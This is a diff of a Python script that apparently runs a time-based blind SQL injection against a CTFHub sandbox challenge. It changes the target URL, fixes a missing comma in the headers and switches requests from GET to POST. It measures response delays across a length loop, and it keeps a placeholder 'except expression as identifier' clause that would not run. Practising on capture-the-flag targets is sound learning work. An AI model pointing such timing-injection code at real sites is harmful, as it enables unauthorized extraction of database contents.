@@ -1,7 +1,7 @@
 import requests
 from datetime import datetime
 
-burl = 'http://challenge-7d1dd3a74e682725.sandbox.ctfhub.com:10080/'
+burl = 'http://challenge-43e20d4ad0fdedf1.sandbox.ctfhub.com:10080/'
 url = f"""{burl}?id=1"""
 sleep_second = 3
 true_delay = sleep_second - 1
@@ -18,7 +18,7 @@ headers = {
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43',
-    'Referer':  f'{burl}/admin539/login.php'
+    'Referer':  f'{burl}/admin539/login.php',
     'Connection': 'close',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
@@ -44,7 +44,7 @@ for length in range(1, 99):
         start_time = datetime.now()
         try:
             # result = req.post(url=curl, data=data, headers=headers, cookies=cookies)
-            result = req.get(url=curl)
+            result = req.post(url=curl, data=data, headers=headers)
         except expression as identifier:
             continue
         end_time = datetime.now()
